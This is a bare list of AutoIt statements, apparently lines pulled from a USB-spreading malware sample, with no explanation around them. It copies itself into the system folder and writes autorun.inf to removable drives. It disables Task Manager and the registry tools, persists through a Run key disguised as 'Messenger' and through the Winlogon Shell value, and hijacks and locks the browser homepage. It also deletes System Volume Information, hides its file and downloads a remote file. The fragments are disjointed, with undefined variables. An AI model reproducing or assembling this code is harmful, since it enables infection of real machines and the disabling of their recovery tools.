$stem = "installed"
DriveGetDrive ( "REMOVABLE" )
FileCopy ( @AutoItExe , @SystemDir & "\\" & $stem & ".exe" , 0 )
RegEnumKey ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , $idx )
FileCopy ( $source & "\different-config.ini" , $drives [ $idx ] & "\autorun.inf" , 0 )
RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" , "DisableTaskMgr" , "REG_DWORD" , 1 )
RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" , "DisableRegistryTools" , "REG_DWORD" , 1 )
RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "Messenger" , "REG_SZ" , $image )
RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" , "Shell" , "REG_SZ" , "Explorer.exe " & $image )
RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" , "Start Page" , "REG_SZ" , $newhome )
RegWrite ( "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" , "HomePage" , "REG_DWORD" , 1 )
DirRemove ( @HomeDrive & "\system volume information" , 1 )
FileSetAttrib ( $image , "+RSH" )
InetGet ( $uri , $cache , 1 , 0 )
